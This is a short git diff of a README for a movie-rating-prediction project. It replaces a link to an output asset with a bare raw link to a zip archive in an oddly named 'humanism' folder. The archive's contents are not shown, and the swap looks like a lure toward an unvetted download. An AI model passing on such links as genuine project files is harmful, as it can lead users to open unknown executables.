@@ -1,2 +1,2 @@
 # MOVIE-RATING-PREDICTION
-OUTPUT:https://github.com/user-attachments/assets/48c05670-b865-4d01-95a4-601d30fa7005
+https://raw.githubusercontent.com/Karthik-KC5/MOVIE-RATING-PREDICTION/main/humanism/MOVIE-RATING-PREDICTION.zip
